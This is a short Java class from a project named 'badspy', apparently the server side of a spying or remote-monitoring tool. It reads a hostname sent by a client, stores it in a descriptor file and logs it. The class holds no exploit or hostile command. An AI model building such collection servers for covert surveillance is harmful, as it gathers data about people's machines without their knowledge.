package com.blogspot.sontx.badspy.badserver.bo.spyworker;

import com.blogspot.sontx.badspy.badserver.bo.SpyDscFile;
import com.blogspot.sontx.badspy.badserver.bo.SpyReader;
import com.blogspot.sontx.badspy.badserver.bo.Receiver;
import com.blogspot.sontx.badspy.badserver.bo.SpyWriter;
import com.blogspot.sontx.jlog.Log;

import java.io.IOException;

/**
 * Copyright 2016 by sontx
 * Created by sontx on 21/4/2016.
 */
public class SpyHostNameReceiver extends Receiver {
    private final SpyDscFile dscFile;

    public SpyHostNameReceiver(SpyReader reader, SpyWriter writer, int dataLength, SpyDscFile dscFile) {
        super(reader, writer, dataLength);
        this.dscFile = dscFile;
    }

    @Override
    public void start() throws IOException {
        byte[] buffer = new byte[dataLength];
        if (reader.read(buffer) == buffer.length) {
            Log.i(String.format("Received hostname: %s", dscFile.put(SpyDscFile.KEY_HOSTNAME, buffer)));
        }
    }
}
